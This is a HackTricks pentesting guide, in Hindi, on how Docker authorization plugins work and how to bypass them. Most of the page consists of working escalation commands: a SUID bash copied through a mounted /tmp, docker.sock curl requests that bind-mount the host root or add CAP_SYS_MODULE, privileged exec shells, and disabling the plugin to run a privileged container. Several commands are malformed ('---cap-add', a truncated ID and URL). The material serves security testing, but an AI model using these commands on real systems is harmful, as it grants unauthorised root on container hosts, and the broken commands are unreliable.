{{#include ../../../banners/hacktricks-training.md}}

**Docker** का बॉक्स से बाहर का **अधिकार** मॉडल **सब या कुछ नहीं** है। किसी भी उपयोगकर्ता को जो Docker डेमन तक पहुँचने की अनुमति रखता है, वह **किसी भी** Docker क्लाइंट **कमांड** को **चलाने** की अनुमति है। यह Docker के इंजन API का उपयोग करने वाले कॉलर्स के लिए भी सच है। यदि आपको **अधिक पहुँच नियंत्रण** की आवश्यकता है, तो आप **अधिकार प्लगइन्स** बना सकते हैं और उन्हें अपने Docker डेमन कॉन्फ़िगरेशन में जोड़ सकते हैं। एक अधिकार प्लगइन का उपयोग करके, एक Docker प्रशासक **सूक्ष्म पहुँच** नीतियों को Docker डेमन तक पहुँच प्रबंधित करने के लिए **कॉन्फ़िगर** कर सकता है।

# बुनियादी आर्किटेक्चर

Docker Auth प्लगइन्स **बाहरी** **प्लगइन्स** हैं जिन्हें आप **कार्रवाइयों** को **अनुमति/अस्वीकृति** देने के लिए उपयोग कर सकते हैं जो Docker डेमन को **उपयोगकर्ता** के आधार पर अनुरोध की गई हैं और **अनुरोधित** **कार्रवाई** पर निर्भर करती हैं।

**[निम्नलिखित जानकारी दस्तावेज़ों से है](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

जब एक **HTTP** **अनुरोध** Docker **डेमन** को CLI के माध्यम से या इंजन API के माध्यम से किया जाता है, तो **प्रमाणीकरण** **उपप्रणाली** **अनुरोध** को स्थापित **प्रमाणीकरण** **प्लगइन**(s) को **भेजती** है। अनुरोध में उपयोगकर्ता (कॉलर) और कमांड संदर्भ होता है। **प्लगइन** यह तय करने के लिए जिम्मेदार है कि अनुरोध को **अनुमति** दी जाए या **अस्वीकृत** किया जाए।

नीचे दिए गए अनुक्रम आरेख अनुमति और अस्वीकृति अधिकार प्रवाह को दर्शाते हैं:

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)

प्रत्येक अनुरोध जो प्लगइन को भेजा जाता है, **प्रमाणित उपयोगकर्ता, HTTP हेडर, और अनुरोध/प्रतिक्रिया शरीर** को शामिल करता है। केवल **उपयोगकर्ता नाम** और **प्रमाणीकरण विधि** जो उपयोग की गई है, प्लगइन को भेजी जाती है। सबसे महत्वपूर्ण बात, **कोई** उपयोगकर्ता **क्रेडेंशियल्स** या टोकन नहीं भेजे जाते हैं। अंत में, **सभी अनुरोध/प्रतिक्रिया शरीर** को अधिकार प्लगइन को नहीं भेजा जाता है। केवल वे अनुरोध/प्रतिक्रिया शरीर जहां `Content-Type` या तो `text/*` या `application/json` है, भेजे जाते हैं।

उन कमांड के लिए जो HTTP कनेक्शन को संभावित रूप से हाईजैक कर सकते हैं (`HTTP Upgrade`), जैसे `exec`, अधिकार प्लगइन केवल प्रारंभिक HTTP अनुरोधों के लिए कॉल किया जाता है। एक बार जब प्लगइन कमांड को मंजूरी देता है, तो शेष प्रवाह पर अधिकार लागू नहीं होता है। विशेष रूप से, स्ट्रीमिंग डेटा को अधिकार प्लगइन्स को नहीं भेजा जाता है। उन कमांड के लिए जो चंक्ड HTTP प्रतिक्रिया लौटाते हैं, जैसे `logs` और `events`, केवल HTTP अनुरोध को अधिकार प्लगइन्स को भेजा जाता है।

अनुरोध/प्रतिक्रिया प्रसंस्करण के दौरान, कुछ अधिकार प्रवाह को Docker डेमन के लिए अतिरिक्त प्रश्न करने की आवश्यकता हो सकती है। ऐसे प्रवाह को पूरा करने के लिए, प्लगइन्स नियमित उपयोगकर्ता के समान डेमन API को कॉल कर सकते हैं। इन अतिरिक्त प्रश्नों को सक्षम करने के लिए, प्लगइन को एक प्रशासक को उचित प्रमाणीकरण और सुरक्षा नीतियों को कॉन्फ़िगर करने के लिए साधन प्रदान करना चाहिए।

## कई प्लगइन्स

आप **पंजीकरण** के लिए जिम्मेदार हैं अपने **प्लगइन** को Docker डेमन **स्टार्टअप** के हिस्से के रूप में। आप **कई प्लगइन्स स्थापित कर सकते हैं और उन्हें एक साथ जोड़ सकते हैं**। यह श्रृंखला क्रमबद्ध हो सकती है। डेमन के लिए प्रत्येक अनुरोध श्रृंखला के माध्यम से क्रम में पास होता है। केवल जब **सभी प्लगइन्स संसाधन तक पहुँच प्रदान करते हैं**, तब पहुँच दी जाती है।

# प्लगइन उदाहरण

## Twistlock AuthZ Broker

प्लगइन [**authz**](https://github.com/twistlock/authz) आपको एक सरल **JSON** फ़ाइल बनाने की अनुमति देता है जिसे **प्लगइन** अनुरोधों को अधिकृत करने के लिए **पढ़ेगा**। इसलिए, यह आपको बहुत आसानी से नियंत्रित करने का अवसर देता है कि कौन से API एंडपॉइंट प्रत्येक उपयोगकर्ता तक पहुँच सकते हैं।

यह एक उदाहरण है जो एलीस और बॉब को नए कंटेनर बनाने की अनुमति देगा: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

पृष्ठ [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) में आप अनुरोधित URL और कार्रवाई के बीच संबंध पा सकते हैं। पृष्ठ [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) में आप कार्रवाई नाम और कार्रवाई के बीच संबंध पा सकते हैं।

## सरल प्लगइन ट्यूटोरियल

आप यहाँ एक **समझने में आसान प्लगइन** पा सकते हैं जिसमें स्थापना और डिबगिंग के बारे में विस्तृत जानकारी है: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

समझने के लिए `README` और `plugin.go` कोड पढ़ें कि यह कैसे काम कर रहा है।

# Docker Auth Plugin Bypass

## पहुँच की गणना करें

जांचने के लिए मुख्य बातें हैं **कौन से एंडपॉइंट्स की अनुमति है** और **कौन से HostConfig के मानों की अनुमति है**।

इस गणना को करने के लिए आप **उपकरण** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)** का उपयोग कर सकते हैं।**

## अस्वीकृत `run --privileged`

### न्यूनतम विशेषाधिकार
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### एक कंटेनर चलाना और फिर एक विशेषाधिकार प्राप्त सत्र प्राप्त करना

इस मामले में sysadmin ने **उपयोगकर्ताओं को वॉल्यूम माउंट करने और `--privileged` फ्लैग के साथ कंटेनर चलाने** या कंटेनर को कोई अतिरिक्त क्षमता देने की अनुमति नहीं दी:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
हालांकि, एक उपयोगकर्ता **चल रहे कंटेनर के अंदर एक शेल बना सकता है और उसे अतिरिक्त विशेषाधिकार दे सकता है**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
अब, उपयोगकर्ता किसी भी [**पहले चर्चा की गई तकनीकों**](./#privileged-flag) का उपयोग करके कंटेनर से बाहर निकल सकता है और **होस्ट के अंदर विशेषाधिकार बढ़ा सकता है**।

## लिखने योग्य फ़ोल्डर माउंट करें

इस मामले में, सिस्टम प्रशासक ने **उपयोगकर्ताओं को `--privileged` ध्वज के साथ कंटेनर चलाने की अनुमति नहीं दी** या कंटेनर को कोई अतिरिक्त क्षमता देने की अनुमति नहीं दी, और उसने केवल `/tmp` फ़ोल्डर को माउंट करने की अनुमति दी:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> ध्यान दें कि आप शायद `/tmp` फ़ोल्डर को माउंट नहीं कर सकते, लेकिन आप एक **विभिन्न लिखने योग्य फ़ोल्डर** को माउंट कर सकते हैं। आप लिखने योग्य निर्देशिकाएँ खोजने के लिए: `find / -writable -type d 2>/dev/null` का उपयोग कर सकते हैं।
>
> **ध्यान दें कि लिनक्स मशीन में सभी निर्देशिकाएँ suid बिट का समर्थन नहीं करेंगी!** यह जांचने के लिए कि कौन सी निर्देशिकाएँ suid बिट का समर्थन करती हैं, `mount | grep -v "nosuid"` चलाएँ। उदाहरण के लिए, आमतौर पर `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` और `/var/lib/lxcfs` suid बिट का समर्थन नहीं करते हैं।
>
> यह भी ध्यान दें कि यदि आप **`/etc`** या किसी अन्य फ़ोल्डर को **कॉन्फ़िगरेशन फ़ाइलें** शामिल करते हुए **माउंट कर सकते हैं**, तो आप उन्हें रूट के रूप में डॉकर कंटेनर से बदल सकते हैं ताकि आप **होस्ट में उनका दुरुपयोग कर सकें** और विशेषाधिकार बढ़ा सकें (शायद `/etc/shadow` को संशोधित करके)।

## Unchecked API Endpoint

इस प्लगइन को कॉन्फ़िगर करने वाले सिस्टम प्रशासक की जिम्मेदारी यह होगी कि वह यह नियंत्रित करे कि प्रत्येक उपयोगकर्ता कौन सी क्रियाएँ और किस विशेषाधिकार के साथ कर सकता है। इसलिए, यदि प्रशासक ने अंत बिंदुओं और विशेषताओं के साथ **ब्लैकलिस्ट** दृष्टिकोण अपनाया है, तो वह कुछ **भूल सकता है** जो हमलावर को **विशेषाधिकार बढ़ाने** की अनुमति दे सकता है।

आप डॉकर API की जांच कर सकते हैं [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Unchecked JSON Structure

### Binds in root

संभव है कि जब सिस्टम प्रशासक ने डॉकर फ़ायरवॉल कॉन्फ़िगर किया, तो उसने [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) के कुछ महत्वपूर्ण पैरामीटर को **भूल गया** जैसे "**Binds**"।\
निम्नलिखित उदाहरण में, इस गलत कॉन्फ़िगरेशन का दुरुपयोग करके एक कंटेनर बनाना और चलाना संभव है जो होस्ट के रूट (/) फ़ोल्डर को माउंट करता है:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> ध्यान दें कि इस उदाहरण में हम **`Binds`** पैरामीटर का उपयोग JSON में एक रूट स्तर की कुंजी के रूप में कर रहे हैं लेकिन API में यह **`HostConfig`** कुंजी के तहत दिखाई देता है।

### HostConfig में Binds

**Docker API** पर इस **request** को करते समय **Binds in root** के साथ वही निर्देशों का पालन करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

**Binds in root** के साथ वही निर्देशों का पालन करें इस **request** को Docker API पर करते हुए:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

**रूट** में **बाइंड्स** के साथ वही निर्देशों का पालन करते हुए इस **अनुरोध** को Docker API पर करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

यह संभव है कि जब सिस्टम प्रशासक ने डॉकर फ़ायरवॉल को कॉन्फ़िगर किया, तो उसने [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) के एक पैरामीटर के "**Capabilities**" जैसे कुछ महत्वपूर्ण विशेषता के बारे में **भूल गया**। निम्नलिखित उदाहरण में, इस गलत कॉन्फ़िगरेशन का दुरुपयोग करके **SYS_MODULE** क्षमता के साथ एक कंटेनर बनाने और चलाने की संभावना है:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> **`HostConfig`** वह कुंजी है जो आमतौर पर कंटेनर से बाहर निकलने के लिए **दिलचस्प** **अधिकार** रखती है। हालाँकि, जैसा कि हमने पहले चर्चा की है, ध्यान दें कि इसके बाहर Binds का उपयोग करना भी काम करता है और आपको प्रतिबंधों को बायपास करने की अनुमति दे सकता है।

## प्लगइन को अक्षम करना

यदि **sysadmin** ने **प्लगइन** को **अक्षम** करने की क्षमता को **रोकने** के लिए **भूल** किया है, तो आप इसका लाभ उठाकर इसे पूरी तरह से अक्षम कर सकते हैं!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
याद रखें कि **उन्नयन के बाद प्लगइन को फिर से सक्षम करें**, अन्यथा **डॉकर सेवा का पुनरारंभ काम नहीं करेगा**!

## ऑथ प्लगइन बायपास लेख

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
